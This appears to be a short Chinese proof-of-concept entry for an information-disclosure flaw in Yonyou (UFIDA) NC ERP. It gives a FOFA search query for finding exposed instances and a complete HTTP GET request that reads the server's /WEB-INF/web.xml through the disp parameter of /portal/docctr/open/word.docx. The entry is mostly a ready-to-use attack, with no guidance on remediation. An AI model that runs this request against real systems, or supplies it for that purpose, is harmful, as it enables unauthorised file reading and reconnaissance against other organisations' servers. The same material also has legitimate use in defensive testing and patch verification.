# 用友NC系统word.docx存在信息泄露漏洞

用友NC系统word.docx存在信息泄露漏洞

## fofa

```javascript
app="用友-UFIDA-NC"
```

## poc

```javascript
GET /portal/docctr/open/word.docx?disp=/WEB-INF/web.xml HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Connection: keep-alive
Cookie: JSESSIONID=722CE6F799BBDE1ED1AFA8DC032B06C0.ncServer; JSESSIONID=6BDD75C8E88EE19ED89FF84865C74059.ncServer
Host: 
If-Modified-Since: Mon, 07 Jan 2019 01:42:44 GMT
If-None-Match: W/"15737-1546825364907"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
```

![image-20241017142208558](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410171422653.png)